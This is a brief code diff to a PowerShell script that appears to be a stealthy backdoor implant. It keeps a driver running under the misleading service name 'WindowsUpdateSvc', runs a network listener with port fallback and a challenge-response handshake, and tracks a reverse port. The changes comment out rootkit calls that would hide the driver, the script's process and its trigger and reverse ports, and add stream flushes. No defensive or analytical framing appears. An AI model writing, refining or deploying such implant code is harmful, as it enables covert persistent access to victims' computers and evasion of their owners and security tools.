@@ -30,14 +30,14 @@ while ($true) {
         # Keep driver alive
         if ((sc.exe query WindowsUpdateSvc | Select-String "RUNNING") -eq $null) {
             sc.exe start WindowsUpdateSvc | Out-Null
-            Invoke-Nidhogg "driver hide C:\Windows\System32\drivers\Nidhogg.sys"
+            # Invoke-Nidhogg "driver hide C:\Windows\System32\drivers\Nidhogg.sys"
         }
 
         # Periodic re-hiding
         if ((Get-Random -Maximum 10) -eq 0) {
-            Invoke-Nidhogg "process hide $PID"
-            Invoke-Nidhogg "port hide $TriggerPort tcp remote"
-            Invoke-Nidhogg "port hide $CurrentReversePort tcp remote"
+            # Invoke-Nidhogg "process hide $PID"
+            # Invoke-Nidhogg "port hide $TriggerPort tcp remote"
+            # Invoke-Nidhogg "port hide $CurrentReversePort tcp remote"
         }
 
         # ====================== LISTENER WITH PORT FALLBACK ======================
@@ -76,6 +76,8 @@ while ($true) {
 
             # HMAC Challenge-Response
             $challenge = Get-Random -Maximum 1000000000
+            $writer.Flush()
+            $stream.Flush()
             
             try {
                 $response = $reader.ReadLine()
